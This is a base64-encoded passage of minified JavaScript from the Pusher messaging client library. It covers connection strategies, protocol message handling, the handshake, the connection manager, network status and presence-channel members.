wuZXh0ZW5kKHt9LGwsdCk7cmV0dXJuIG8oZSxuKVsxXS5zdHJhdGVneX19LHU9e3dzOlB1c2hlci5XU1RyYW5zcG9ydCxzb2NranM6UHVzaGVyLlNvY2tKU1RyYW5zcG9ydCx4aHJfc3RyZWFtaW5nOlB1c2hlci5YSFJTdHJlYW1pbmdUcmFuc3BvcnQseGRyX3N0cmVhbWluZzpQdXNoZXIuWERSU3RyZWFtaW5nVHJhbnNwb3J0LHhocl9wb2xsaW5nOlB1c2hlci5YSFJQb2xsaW5nVHJhbnNwb3J0LHhkcl9wb2xsaW5nOlB1c2hlci5YRFJQb2xsaW5nVHJhbnNwb3J0fSxjPXtpc1N1cHBvcnRlZDpmdW5jdGlvbigpe3JldHVybiExfSxjb25uZWN0OmZ1bmN0aW9uKGUsdCl7dmFyIG49UHVzaGVyLlV0aWwuZGVmZXIoZnVuY3Rpb24oKXt0KG5ldyBQdXNoZXIuRXJyb3JzLlVuc3VwcG9ydGVkU3RyYXRlZ3kpfSk7cmV0dXJue2Fib3J0OmZ1bmN0aW9uKCl7bi5lbnN1cmVBYm9ydGVkKCl9LGZvcmNlTWluUHJpb3JpdHk6ZnVuY3Rpb24oKXt9fX19LGw9e2V4dGVuZDpmdW5jdGlvbihlLHQsbil7cmV0dXJuW1B1c2hlci5VdGlsLmV4dGVuZCh7fSx0LG4pLGVdfSxkZWY6ZnVuY3Rpb24oZSx0LG4pe2lmKHZvaWQgMCE9PWVbdF0pdGhyb3ciUmVkZWZpbmluZyBzeW1ib2wgIit0O3JldHVybiBlW3RdPW4sW3ZvaWQgMCxlXX0sZGVmX3RyYW5zcG9ydDpmdW5jdGlvbihlLHQsbixyLGkscyl7dmFyIG89dVtuXTtpZighbyl0aHJvdyBuZXcgUHVzaGVyLkVycm9ycy5VbnN1cHBvcnRlZFRyYW5zcG9ydChuKTt2YXIgYSxsPSEoZS5lbmFibGVkVHJhbnNwb3J0cyYmLTE9PT1QdXNoZXIuVXRpbC5hcnJheUluZGV4T2YoZS5lbmFibGVkVHJhbnNwb3J0cyx0KXx8ZS5kaXNhYmxlZFRyYW5zcG9ydHMmJi0xIT09UHVzaGVyLlV0aWwuYXJyYXlJbmRleE9mKGUuZGlzYWJsZWRUcmFuc3BvcnRzLHQpKTthPWw/bmV3IFB1c2hlci5UcmFuc3BvcnRTdHJhdGVneSh0LHIscz9zLmdldEFzc2lzdGFudChvKTpvLFB1c2hlci5VdGlsLmV4dGVuZCh7a2V5OmUua2V5LGVuY3J5cHRlZDplLmVuY3J5cHRlZCx0aW1lbGluZTplLnRpbWVsaW5lLGlnbm9yZU51bGxPcmlnaW46ZS5pZ25vcmVOdWxsT3JpZ2lufSxpKSk6Yzt2YXIgZD1lLmRlZihlLHQsYSlbMV07cmV0dXJuIGQudHJhbnNwb3J0cz1lLnRyYW5zcG9ydHN8fHt9LGQudHJhbnNwb3J0c1t0XT1hLFt2b2lkIDAsZF19LHRyYW5zcG9ydF9tYW5hZ2VyOmUoZnVuY3Rpb24oZSx0KXtyZXR1cm4gbmV3IFB1c2hlci5UcmFuc3BvcnRNYW5hZ2VyKHQpfSksc2VxdWVudGlhbDplKGZ1bmN0aW9uKGUsdCl7dmFyIG49QXJyYXkucHJvdG90eXBlLnNsaWNlLmNhbGwoYXJndW1lbnRzLDIpO3JldHVybiBuZXcgUHVzaGVyLlNlcXVlbnRpYWxTdHJhdGVneShuLHQpfSksY2FjaGVkOmUoZnVuY3Rpb24oZSx0LG4pe3JldHVybiBuZXcgUHVzaGVyLkNhY2hlZFN0cmF0ZWd5KG4sZS50cmFuc3BvcnRzLHt0dGw6dCx0aW1lbGluZTplLnRpbWVsaW5lLGVuY3J5cHRlZDplLmVuY3J5cHRlZH0pfSksZmlyc3RfY29ubmVjdGVkOmUoZnVuY3Rpb24oZSx0KXtyZXR1cm4gbmV3IFB1c2hlci5GaXJzdENvbm5lY3RlZFN0cmF0ZWd5KHQpfSksYmVzdF9jb25uZWN0ZWRfZXZlcjplKGZ1bmN0aW9uKCl7dmFyIGU9QXJyYXkucHJvdG90eXBlLnNsaWNlLmNhbGwoYXJndW1lbnRzLDEpO3JldHVybiBuZXcgUHVzaGVyLkJlc3RDb25uZWN0ZWRFdmVyU3RyYXRlZ3koZSl9KSxkZWxheWVkOmUoZnVuY3Rpb24oZSx0LG4pe3JldHVybiBuZXcgUHVzaGVyLkRlbGF5ZWRTdHJhdGVneShuLHtkZWxheTp0fSl9KSwiaWYiOmUoZnVuY3Rpb24oZSx0LG4scil7cmV0dXJuIG5ldyBQdXNoZXIuSWZTdHJhdGVneSh0LG4scil9KSxpc19zdXBwb3J0ZWQ6ZShmdW5jdGlvbihlLHQpe3JldHVybiBmdW5jdGlvbigpe3JldHVybiB0LmlzU3VwcG9ydGVkKCl9fSl9O1B1c2hlci5TdHJhdGVneUJ1aWxkZXI9YX0uY2FsbCh0aGlzKSxmdW5jdGlvbigpe3ZhciBlPXt9O2UuZGVjb2RlTWVzc2FnZT1mdW5jdGlvbihlKXt0cnl7dmFyIHQ9SlNPTi5wYXJzZShlLmRhdGEpO2lmKCJzdHJpbmciPT10eXBlb2YgdC5kYXRhKXRyeXsNCnQuZGF0YT1KU09OLnBhcnNlKHQuZGF0YSl9Y2F0Y2gobil7aWYoIShuIGluc3RhbmNlb2YgU3ludGF4RXJyb3IpKXRocm93IG59cmV0dXJuIHR9Y2F0Y2gobil7dGhyb3d7dHlwZToiTWVzc2FnZVBhcnNlRXJyb3IiLGVycm9yOm4sZGF0YTplLmRhdGF9fX0sZS5lbmNvZGVNZXNzYWdlPWZ1bmN0aW9uKGUpe3JldHVybiBKU09OLnN0cmluZ2lmeShlKX0sZS5wcm9jZXNzSGFuZHNoYWtlPWZ1bmN0aW9uKGUpe2lmKGU9dGhpcy5kZWNvZGVNZXNzYWdlKGUpLCJwdXNoZXI6Y29ubmVjdGlvbl9lc3RhYmxpc2hlZCI9PT1lLmV2ZW50KXtpZighZS5kYXRhLmFjdGl2aXR5X3RpbWVvdXQpdGhyb3ciTm8gYWN0aXZpdHkgdGltZW91dCBzcGVjaWZpZWQgaW4gaGFuZHNoYWtlIjtyZXR1cm57YWN0aW9uOiJjb25uZWN0ZWQiLGlkOmUuZGF0YS5zb2NrZXRfaWQsYWN0aXZpdHlUaW1lb3V0OjFlMyplLmRhdGEuYWN0aXZpdHlfdGltZW91dH19aWYoInB1c2hlcjplcnJvciI9PT1lLmV2ZW50KXJldHVybnthY3Rpb246dGhpcy5nZXRDbG9zZUFjdGlvbihlLmRhdGEpLGVycm9yOnRoaXMuZ2V0Q2xvc2VFcnJvcihlLmRhdGEpfTt0aHJvdyJJbnZhbGlkIGhhbmRzaGFrZSJ9LGUuZ2V0Q2xvc2VBY3Rpb249ZnVuY3Rpb24oZSl7cmV0dXJuIGUuY29kZTw0ZTM/ZS5jb2RlPj0xMDAyJiZlLmNvZGU8PTEwMDQ/ImJhY2tvZmYiOm51bGw6NGUzPT09ZS5jb2RlPyJzc2xfb25seSI6ZS5jb2RlPDQxMDA/InJlZnVzZWQiOmUuY29kZTw0MjAwPyJiYWNrb2ZmIjplLmNvZGU8NDMwMD8icmV0cnkiOiJyZWZ1c2VkIn0sZS5nZXRDbG9zZUVycm9yPWZ1bmN0aW9uKGUpe3JldHVybiAxZTMhPT1lLmNvZGUmJjEwMDEhPT1lLmNvZGU/e3R5cGU6IlB1c2hlckVycm9yIixkYXRhOntjb2RlOmUuY29kZSxtZXNzYWdlOmUucmVhc29ufHxlLm1lc3NhZ2V9fTpudWxsfSxQdXNoZXIuUHJvdG9jb2w9ZX0uY2FsbCh0aGlzKSxmdW5jdGlvbigpe2Z1bmN0aW9uIGUoZSx0KXtQdXNoZXIuRXZlbnRzRGlzcGF0Y2hlci5jYWxsKHRoaXMpLHRoaXMuaWQ9ZSx0aGlzLnRyYW5zcG9ydD10LHRoaXMuYWN0aXZpdHlUaW1lb3V0PXQuYWN0aXZpdHlUaW1lb3V0LHRoaXMuYmluZExpc3RlbmVycygpfXZhciB0PWUucHJvdG90eXBlO1B1c2hlci5VdGlsLmV4dGVuZCh0LFB1c2hlci5FdmVudHNEaXNwYXRjaGVyLnByb3RvdHlwZSksdC5oYW5kbGVzQWN0aXZpdHlDaGVja3M9ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy50cmFuc3BvcnQuaGFuZGxlc0FjdGl2aXR5Q2hlY2tzKCl9LHQuc2VuZD1mdW5jdGlvbihlKXtyZXR1cm4gdGhpcy50cmFuc3BvcnQuc2VuZChlKX0sdC5zZW5kX2V2ZW50PWZ1bmN0aW9uKGUsdCxuKXt2YXIgcj17ZXZlbnQ6ZSxkYXRhOnR9O3JldHVybiBuJiYoci5jaGFubmVsPW4pLFB1c2hlci5kZWJ1ZygiRXZlbnQgc2VudCIsciksdGhpcy5zZW5kKFB1c2hlci5Qcm90b2NvbC5lbmNvZGVNZXNzYWdlKHIpKX0sdC5waW5nPWZ1bmN0aW9uKCl7dGhpcy50cmFuc3BvcnQuc3VwcG9ydHNQaW5nKCk/dGhpcy50cmFuc3BvcnQucGluZygpOnRoaXMuc2VuZF9ldmVudCgicHVzaGVyOnBpbmciLHt9KX0sdC5jbG9zZT1mdW5jdGlvbigpe3RoaXMudHJhbnNwb3J0LmNsb3NlKCl9LHQuYmluZExpc3RlbmVycz1mdW5jdGlvbigpe3ZhciBlPXRoaXMsdD17bWVzc2FnZTpmdW5jdGlvbih0KXt2YXIgbjt0cnl7bj1QdXNoZXIuUHJvdG9jb2wuZGVjb2RlTWVzc2FnZSh0KX1jYXRjaChyKXtlLmVtaXQoImVycm9yIix7dHlwZToiTWVzc2FnZVBhcnNlRXJyb3IiLGVycm9yOnIsZGF0YTp0LmRhdGF9KX1pZih2b2lkIDAhPT1uKXtzd2l0Y2goUHVzaGVyLmRlYnVnKCJFdmVudCByZWNkIixuKSxuLmV2ZW50KXtjYXNlInB1c2hlcjplcnJvciI6ZS5lbWl0KCJlcnJvciIse3R5cGU6IlB1c2hlckVycm9yIixkYXRhOm4uZGF0YX0pO2JyZWFrO2Nhc2UicHVzaGVyOnBpbmciOmUuZW1pdCgicGluZyIpO2JyZWFrO2Nhc2UicHVzaGVyOnBvbmciOmUuZW1pdCgicG9uZyIpfWUuZW1pdCgibWVzc2FnZSIsbil9fSxhY3Rpdml0eTpmdW5jdGlvbigpe2UuZW1pdCgiYWN0aXZpdHkiKX0sZXJyb3I6ZnVuY3Rpb24odCl7ZS5lbWl0KCJlcnJvciIse3R5cGU6IldlYlNvY2tldEVycm9yIixlcnJvcjp0fSl9LGNsb3NlZDpmdW5jdGlvbih0KXtuKCksdCYmdC5jb2RlJiZlLmhhbmRsZUNsb3NlRXZlbnQodCksZS50cmFuc3BvcnQ9bnVsbCxlLmVtaXQoImNsb3NlZCIpfX0sbj1mdW5jdGlvbigpe1B1c2hlci5VdGlsLm9iamVjdEFwcGx5KHQsZnVuY3Rpb24odCxuKXtlLnRyYW5zcG9ydC51bmJpbmQobix0KX0pfTtQdXNoZXIuVXRpbC5vYmplY3RBcHBseSh0LGZ1bmN0aW9uKHQsbil7ZS50cmFuc3BvcnQuYmluZChuLHQpfSl9LHQuaGFuZGxlQ2xvc2VFdmVudD1mdW5jdGlvbihlKXt2YXIgdD1QdXNoZXIuUHJvdG9jb2wuZ2V0Q2xvc2VBY3Rpb24oZSksbj1QdXNoZXIuUHJvdG9jb2wuZ2V0Q2xvc2VFcnJvcihlKTtuJiZ0aGlzLmVtaXQoImVycm9yIixuKSx0JiZ0aGlzLmVtaXQodCl9LFB1c2hlci5Db25uZWN0aW9uPWV9LmNhbGwodGhpcyksZnVuY3Rpb24oKXtmdW5jdGlvbiBlKGUsdCl7dGhpcy50cmFuc3BvcnQ9ZSx0aGlzLmNhbGxiYWNrPXQsdGhpcy5iaW5kTGlzdGVuZXJzKCl9dmFyIHQ9ZS5wcm90b3R5cGU7dC5jbG9zZT1mdW5jdGlvbigpe3RoaXMudW5iaW5kTGlzdGVuZXJzKCksdGhpcy50cmFuc3BvcnQuY2xvc2UoKX0sdC5iaW5kTGlzdGVuZXJzPWZ1bmN0aW9uKCl7dmFyIGU9dGhpcztlLm9uTWVzc2FnZT1mdW5jdGlvbih0KXtlLnVuYmluZExpc3RlbmVycygpO3RyeXt2YXIgbj1QdXNoZXIuUHJvdG9jb2wucHJvY2Vzc0hhbmRzaGFrZSh0KTsiY29ubmVjdGVkIj09PW4uYWN0aW9uP2UuZmluaXNoKCJjb25uZWN0ZWQiLHtjb25uZWN0aW9uOm5ldyBQdXNoZXIuQ29ubmVjdGlvbihuLmlkLGUudHJhbnNwb3J0KSxhY3Rpdml0eVRpbWVvdXQ6bi5hY3Rpdml0eVRpbWVvdXR9KTooZS5maW5pc2gobi5hY3Rpb24se2Vycm9yOm4uZXJyb3J9KSxlLnRyYW5zcG9ydC5jbG9zZSgpKX1jYXRjaChyKXtlLmZpbmlzaCgiZXJyb3IiLHtlcnJvcjpyfSksZS50cmFuc3BvcnQuY2xvc2UoKX19LGUub25DbG9zZWQ9ZnVuY3Rpb24odCl7ZS51bmJpbmRMaXN0ZW5lcnMoKTt2YXIgbj1QdXNoZXIuUHJvdG9jb2wuZ2V0Q2xvc2VBY3Rpb24odCl8fCJiYWNrb2ZmIixyPVB1c2hlci5Qcm90b2NvbC5nZXRDbG9zZUVycm9yKHQpO2UuZmluaXNoKG4se2Vycm9yOnJ9KX0sZS50cmFuc3BvcnQuYmluZCgibWVzc2FnZSIsZS5vbk1lc3NhZ2UpLGUudHJhbnNwb3J0LmJpbmQoImNsb3NlZCIsZS5vbkNsb3NlZCl9LHQudW5iaW5kTGlzdGVuZXJzPWZ1bmN0aW9uKCl7dGhpcy50cmFuc3BvcnQudW5iaW5kKCJtZXNzYWdlIix0aGlzLm9uTWVzc2FnZSksdGhpcy50cmFuc3BvcnQudW5iaW5kKCJjbG9zZWQiLHRoaXMub25DbG9zZWQpfSx0LmZpbmlzaD1mdW5jdGlvbihlLHQpe3RoaXMuY2FsbGJhY2soUHVzaGVyLlV0aWwuZXh0ZW5kKHt0cmFuc3BvcnQ6dGhpcy50cmFuc3BvcnQsYWN0aW9uOmV9LHQpKX0sUHVzaGVyLkhhbmRzaGFrZT1lfS5jYWxsKHRoaXMpLGZ1bmN0aW9uKCl7ZnVuY3Rpb24gZShlLHQpe1B1c2hlci5FdmVudHNEaXNwYXRjaGVyLmNhbGwodGhpcyksdGhpcy5rZXk9ZSx0aGlzLm9wdGlvbnM9dHx8e30sdGhpcy5zdGF0ZT0iaW5pdGlhbGl6ZWQiLHRoaXMuY29ubmVjdGlvbj1udWxsLHRoaXMuZW5jcnlwdGVkPSEhdC5lbmNyeXB0ZWQsdGhpcy50aW1lbGluZT10aGlzLm9wdGlvbnMudGltZWxpbmUsdGhpcy5jb25uZWN0aW9uQ2FsbGJhY2tzPXRoaXMuYnVpbGRDb25uZWN0aW9uQ2FsbGJhY2tzKCksdGhpcy5lcnJvckNhbGxiYWNrcz10aGlzLmJ1aWxkRXJyb3JDYWxsYmFja3MoKSx0aGlzLmhhbmRzaGFrZUNhbGxiYWNrcz10aGlzLmJ1aWxkSGFuZHNoYWtlQ2FsbGJhY2tzKHRoaXMuZXJyb3JDYWxsYmFja3MpO3ZhciBuPXRoaXM7UHVzaGVyLk5ldHdvcmsuYmluZCgib25saW5lIixmdW5jdGlvbigpe24udGltZWxpbmUuaW5mbyh7bmV0aW5mbzoib25saW5lIn0pLCJjb25uZWN0aW5nIiE9PW4uc3RhdGUmJiJ1bmF2YWlsYWJsZSIhPT1uLnN0YXRlfHxuLnJldHJ5SW4oMCl9KSxQdXNoZXIuTmV0d29yay5iaW5kKCJvZmZsaW5lIixmdW5jdGlvbigpe24udGltZWxpbmUuaW5mbyh7bmV0aW5mbzoib2ZmbGluZSJ9KSxuLmNvbm5lY3Rpb24mJm4uc2VuZEFjdGl2aXR5Q2hlY2soKX0pLHRoaXMudXBkYXRlU3RyYXRlZ3koKX12YXIgdD1lLnByb3RvdHlwZTtQdXNoZXIuVXRpbC5leHRlbmQodCxQdXNoZXIuRXZlbnRzRGlzcGF0Y2hlci5wcm90b3R5cGUpLHQuY29ubmVjdD1mdW5jdGlvbigpe2lmKCF0aGlzLmNvbm5lY3Rpb24mJiF0aGlzLnJ1bm5lcil7aWYoIXRoaXMuc3RyYXRlZ3kuaXNTdXBwb3J0ZWQoKSlyZXR1cm4gdm9pZCB0aGlzLnVwZGF0ZVN0YXRlKCJmYWlsZWQiKTt0aGlzLnVwZGF0ZVN0YXRlKCJjb25uZWN0aW5nIiksdGhpcy5zdGFydENvbm5lY3RpbmcoKSx0aGlzLnNldFVuYXZhaWxhYmxlVGltZXIoKX19LHQuc2VuZD1mdW5jdGlvbihlKXtyZXR1cm4gdGhpcy5jb25uZWN0aW9uP3RoaXMuY29ubmVjdGlvbi5zZW5kKGUpOiExfSx0LnNlbmRfZXZlbnQ9ZnVuY3Rpb24oZSx0LG4pe3JldHVybiB0aGlzLmNvbm5lY3Rpb24/dGhpcy5jb25uZWN0aW9uLnNlbmRfZXZlbnQoZSx0LG4pOiExfSx0LmRpc2Nvbm5lY3Q9ZnVuY3Rpb24oKXt0aGlzLmRpc2Nvbm5lY3RJbnRlcm5hbGx5KCksdGhpcy51cGRhdGVTdGF0ZSgiZGlzY29ubmVjdGVkIil9LHQuaXNFbmNyeXB0ZWQ9ZnVuY3Rpb24oKXtyZXR1cm4gdGhpcy5lbmNyeXB0ZWR9LHQuc3RhcnRDb25uZWN0aW5nPWZ1bmN0aW9uKCl7dmFyIGU9dGhpcyx0PWZ1bmN0aW9uKG4scil7bj9lLnJ1bm5lcj1lLnN0cmF0ZWd5LmNvbm5lY3QoMCx0KToiZXJyb3IiPT09ci5hY3Rpb24/KGUuZW1pdCgiZXJyb3IiLHt0eXBlOiJIYW5kc2hha2VFcnJvciIsZXJyb3I6ci5lcnJvcn0pLGUudGltZWxpbmUuZXJyb3Ioe2hhbmRzaGFrZUVycm9yOnIuZXJyb3J9KSk6KGUuYWJvcnRDb25uZWN0aW5nKCksZS5oYW5kc2hha2VDYWxsYmFja3Nbci5hY3Rpb25dKHIpKX07ZS5ydW5uZXI9ZS5zdHJhdGVneS5jb25uZWN0KDAsdCl9LHQuYWJvcnRDb25uZWN0aW5nPWZ1bmN0aW9uKCl7dGhpcy5ydW5uZXImJih0aGlzLnJ1bm5lci5hYm9ydCgpLHRoaXMucnVubmVyPW51bGwpfSx0LmRpc2Nvbm5lY3RJbnRlcm5hbGx5PWZ1bmN0aW9uKCl7aWYodGhpcy5hYm9ydENvbm5lY3RpbmcoKSx0aGlzLmNsZWFyUmV0cnlUaW1lcigpLHRoaXMuY2xlYXJVbmF2YWlsYWJsZVRpbWVyKCksdGhpcy5jb25uZWN0aW9uKXt2YXIgZT10aGlzLmFiYW5kb25Db25uZWN0aW9uKCk7ZS5jbG9zZSgpfX0sdC51cGRhdGVTdHJhdGVneT1mdW5jdGlvbigpe3RoaXMuc3RyYXRlZ3k9dGhpcy5vcHRpb25zLmdldFN0cmF0ZWd5KHtrZXk6dGhpcy5rZXksdGltZWxpbmU6dGhpcy50aW1lbGluZSxlbmNyeXB0ZWQ6dGhpcy5lbmNyeXB0ZWR9KX0sdC5yZXRyeUluPWZ1bmN0aW9uKGUpe3ZhciB0PXRoaXM7dC50aW1lbGluZS5pbmZvKHthY3Rpb246InJldHJ5IixkZWxheTplfSksZT4wJiZ0LmVtaXQoImNvbm5lY3RpbmdfaW4iLE1hdGgucm91bmQoZS8xZTMpKSx0LnJldHJ5VGltZXI9bmV3IFB1c2hlci5UaW1lcihlfHwwLGZ1bmN0aW9uKCl7dC5kaXNjb25uZWN0SW50ZXJuYWxseSgpLHQuY29ubmVjdCgpfSl9LHQuY2xlYXJSZXRyeVRpbWVyPWZ1bmN0aW9uKCl7dGhpcy5yZXRyeVRpbWVyJiYodGhpcy5yZXRyeVRpbWVyLmVuc3VyZUFib3J0ZWQoKSx0aGlzLnJldHJ5VGltZXI9bnVsbCl9LHQuc2V0VW5hdmFpbGFibGVUaW1lcj1mdW5jdGlvbigpe3ZhciBlPXRoaXM7ZS51bmF2YWlsYWJsZVRpbWVyPW5ldyBQdXNoZXIuVGltZXIoZS5vcHRpb25zLnVuYXZhaWxhYmxlVGltZW91dCxmdW5jdGlvbigpe2UudXBkYXRlU3RhdGUoInVuYXZhaWxhYmxlIil9KX0sdC5jbGVhclVuYXZhaWxhYmxlVGltZXI9ZnVuY3Rpb24oKXt0aGlzLnVuYXZhaWxhYmxlVGltZXImJnRoaXMudW5hdmFpbGFibGVUaW1lci5lbnN1cmVBYm9ydGVkKCl9LHQuc2VuZEFjdGl2aXR5Q2hlY2s9ZnVuY3Rpb24oKXt2YXIgZT10aGlzO2Uuc3RvcEFjdGl2aXR5Q2hlY2soKSxlLmNvbm5lY3Rpb24ucGluZygpLGUuYWN0aXZpdHlUaW1lcj1uZXcgUHVzaGVyLlRpbWVyKGUub3B0aW9ucy5wb25nVGltZW91dCxmdW5jdGlvbigpe2UudGltZWxpbmUuZXJyb3Ioe3BvbmdfdGltZWRfb3V0OmUub3B0aW9ucy5wb25nVGltZW91dH0pLGUucmV0cnlJbigwKX0pfSx0LnJlc2V0QWN0aXZpdHlDaGVjaz1mdW5jdGlvbigpe3ZhciBlPXRoaXM7ZS5zdG9wQWN0aXZpdHlDaGVjaygpLGUuY29ubmVjdGlvbi5oYW5kbGVzQWN0aXZpdHlDaGVja3MoKXx8KGUuYWN0aXZpdHlUaW1lcj1uZXcgUHVzaGVyLlRpbWVyKGUuYWN0aXZpdHlUaW1lb3V0LGZ1bmN0aW9uKCl7ZS5zZW5kQWN0aXZpdHlDaGVjaygpfSkpfSx0LnN0b3BBY3Rpdml0eUNoZWNrPWZ1bmN0aW9uKCl7dGhpcy5hY3Rpdml0eVRpbWVyJiZ0aGlzLmFjdGl2aXR5VGltZXIuZW5zdXJlQWJvcnRlZCgpfSx0LmJ1aWxkQ29ubmVjdGlvbkNhbGxiYWNrcz1mdW5jdGlvbigpe3ZhciBlPXRoaXM7cmV0dXJue21lc3NhZ2U6ZnVuY3Rpb24odCl7ZS5yZXNldEFjdGl2aXR5Q2hlY2soKSxlLmVtaXQoIm1lc3NhZ2UiLHQpfSxwaW5nOmZ1bmN0aW9uKCl7ZS5zZW5kX2V2ZW50KCJwdXNoZXI6cG9uZyIse30pfSxhY3Rpdml0eTpmdW5jdGlvbigpe2UucmVzZXRBY3Rpdml0eUNoZWNrKCl9LGVycm9yOmZ1bmN0aW9uKHQpe2UuZW1pdCgiZXJyb3IiLHt0eXBlOiJXZWJTb2NrZXRFcnJvciIsZXJyb3I6dH0pfSxjbG9zZWQ6ZnVuY3Rpb24oKXtlLmFiYW5kb25Db25uZWN0aW9uKCksZS5zaG91bGRSZXRyeSgpJiZlLnJldHJ5SW4oMWUzKX19fSx0LmJ1aWxkSGFuZHNoYWtlQ2FsbGJhY2tzPWZ1bmN0aW9uKGUpe3ZhciB0PXRoaXM7cmV0dXJuIFB1c2hlci5VdGlsLmV4dGVuZCh7fSxlLHtjb25uZWN0ZWQ6ZnVuY3Rpb24oZSl7dC5hY3Rpdml0eVRpbWVvdXQ9TWF0aC5taW4odC5vcHRpb25zLmFjdGl2aXR5VGltZW91dCxlLmFjdGl2aXR5VGltZW91dCxlLmNvbm5lY3Rpb24uYWN0aXZpdHlUaW1lb3V0fHwxLzApLHQuY2xlYXJVbmF2YWlsYWJsZVRpbWVyKCksdC5zZXRDb25uZWN0aW9uKGUuY29ubmVjdGlvbiksdC5zb2NrZXRfaWQ9dC5jb25uZWN0aW9uLmlkLHQudXBkYXRlU3RhdGUoImNvbm5lY3RlZCIse3NvY2tldF9pZDp0LnNvY2tldF9pZH0pfX0pfSx0LmJ1aWxkRXJyb3JDYWxsYmFja3M9ZnVuY3Rpb24oKXtmdW5jdGlvbiBlKGUpe3JldHVybiBmdW5jdGlvbihuKXtuLmVycm9yJiZ0LmVtaXQoImVycm9yIix7dHlwZToiV2ViU29ja2V0RXJyb3IiLGVycm9yOm4uZXJyb3J9KSxlKG4pfX12YXIgdD10aGlzO3JldHVybntzc2xfb25seTplKGZ1bmN0aW9uKCl7dC5lbmNyeXB0ZWQ9ITAsdC51cGRhdGVTdHJhdGVneSgpLHQucmV0cnlJbigwKX0pLHJlZnVzZWQ6ZShmdW5jdGlvbigpe3QuZGlzY29ubmVjdCgpfSksYmFja29mZjplKGZ1bmN0aW9uKCl7dC5yZXRyeUluKDFlMyl9KSxyZXRyeTplKGZ1bmN0aW9uKCl7dC5yZXRyeUluKDApfSl9fSx0LnNldENvbm5lY3Rpb249ZnVuY3Rpb24oZSl7dGhpcy5jb25uZWN0aW9uPWU7Zm9yKHZhciB0IGluIHRoaXMuY29ubmVjdGlvbkNhbGxiYWNrcyl0aGlzLmNvbm5lY3Rpb24uYmluZCh0LHRoaXMuY29ubmVjdGlvbkNhbGxiYWNrc1t0XSk7dGhpcy5yZXNldEFjdGl2aXR5Q2hlY2soKX0sdC5hYmFuZG9uQ29ubmVjdGlvbj1mdW5jdGlvbigpe2lmKHRoaXMuY29ubmVjdGlvbil7dGhpcy5zdG9wQWN0aXZpdHlDaGVjaygpO2Zvcih2YXIgZSBpbiB0aGlzLmNvbm5lY3Rpb25DYWxsYmFja3MpdGhpcy5jb25uZWN0aW9uLnVuYmluZChlLHRoaXMuY29ubmVjdGlvbkNhbGxiYWNrc1tlXSk7dmFyIHQ9dGhpcy5jb25uZWN0aW9uO3JldHVybiB0aGlzLmNvbm5lY3Rpb249bnVsbCx0fX0sdC51cGRhdGVTdGF0ZT1mdW5jdGlvbihlLHQpe3ZhciBuPXRoaXMuc3RhdGU7dGhpcy5zdGF0ZT1lLG4hPT1lJiYoUHVzaGVyLmRlYnVnKCJTdGF0ZSBjaGFuZ2VkIixuKyIgLT4gIitlKSx0aGlzLnRpbWVsaW5lLmluZm8oe3N0YXRlOmUscGFyYW1zOnR9KSx0aGlzLmVtaXQoInN0YXRlX2NoYW5nZSIse3ByZXZpb3VzOm4sY3VycmVudDplfSksdGhpcy5lbWl0KGUsdCkpfSx0LnNob3VsZFJldHJ5PWZ1bmN0aW9uKCl7cmV0dXJuImNvbm5lY3RpbmciPT09dGhpcy5zdGF0ZXx8ImNvbm5lY3RlZCI9PT10aGlzLnN0YXRlfSxQdXNoZXIuQ29ubmVjdGlvbk1hbmFnZXI9ZX0uY2FsbCh0aGlzKSxmdW5jdGlvbigpe2Z1bmN0aW9uIGUoKXtQdXNoZXIuRXZlbnRzRGlzcGF0Y2hlci5jYWxsKHRoaXMpO3ZhciBlPXRoaXM7dm9pZCAwIT09d2luZG93LmFkZEV2ZW50TGlzdGVuZXImJih3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcigib25saW5lIixmdW5jdGlvbigpe2UuZW1pdCgib25saW5lIil9LCExKSx3aW5kb3cuYWRkRXZlbnRMaXN0ZW5lcigib2ZmbGluZSIsZnVuY3Rpb24oKXtlLmVtaXQoIm9mZmxpbmUiKX0sITEpKX1QdXNoZXIuVXRpbC5leHRlbmQoZS5wcm90b3R5cGUsUHVzaGVyLkV2ZW50c0Rpc3BhdGNoZXIucHJvdG90eXBlKTt2YXIgdD1lLnByb3RvdHlwZTt0LmlzT25saW5lPWZ1bmN0aW9uKCl7cmV0dXJuIHZvaWQgMD09PXdpbmRvdy5uYXZpZ2F0b3Iub25MaW5lPyEwOndpbmRvdy5uYXZpZ2F0b3Iub25MaW5lfSxQdXNoZXIuTmV0SW5mbz1lLFB1c2hlci5OZXR3b3JrPW5ldyBlfS5jYWxsKHRoaXMpLGZ1bmN0aW9uKCl7ZnVuY3Rpb24gZSgpe3RoaXMucmVzZXQoKX12YXIgdD1lLnByb3RvdHlwZTt0LmdldD1mdW5jdGlvbihlKXtyZXR1cm4gT2JqZWN0LnByb3RvdHlwZS5oYXNPd25Qcm9wZXJ0eS5jYWxsKHRoaXMubWVtYmVycyxlKT97aWQ6ZSxpbmZvOnRoaXMubWVtYmVyc1tlXX06bnVsbH0sdC5lYWNoPWZ1bmN0aW9uKGUpe3ZhciB0PXRoaXM7UHVzaGVyLlV0aWwub2JqZWN0QXBwbHkodC5tZW1iZXJzLGZ1bmN0aW9uKG4scil7ZSh0LmdldChyKSl9KX0sdC5zZXRNeUlEPWZ1bmN0aW9uKGUpe3RoaXMubXlJRD1lfSx0Lm9uU3Vic2NyaXB0aW9uPWZ1bmN0aW9uKGUpe3RoaXMubWVtYmVycz1lLnByZXNlbmNlLmhhc2gsdGhpcy5jb3VudD1lLnByZXNlbmNlLmNvdW50LHRoaXMubWU9dGhpcy5nZXQodGhpcy5teUlEKX0sdC5hZGRNZW1iZXI9ZnVuY3Rpb24oZSl7cmV0dXJuIG51bGw9PT10aGlzLmdldChlLnVzZXJfaWQpJiZ0aGlzLmNvdW50KyssdGhpcy5tZW1iZXJzW2UudXNlcl9pZF09ZS51c2VyX2luZm8sdGhpcy5nZXQoZS51c2VyX2lkKX0sdC5yZW1vdmVNZW1iZXI9ZnVuY3Rpb24oZSl7dmFyIHQ9dGhpcy5nZXQoZS51c2VyX2lkKTtyZXR1cm4gdCYmKGRlbGV0ZSB0aGlzLm1lbWJlcnNbZS51c2VyX2lkXSx0aGlzLmNvdW50LS0pLHR9LHQucmVzZXQ9ZnVuY3Rpb24oKXt0aGlzLm1lbWJlcnM9e30sdGhpcy5jb3VudD0wLHRoaXMubXlJRD1udWxsLHRoaXMubWU9bnVsbH0sUHVzaGVyLk1lbWJlcnM9ZX0uY2FsbCh0aGlzKSxmdW5jdGlvbigpe2Z1bmN0aW9uIGUoZSx0KXtQdXNoZXIuRXZlbnRzRG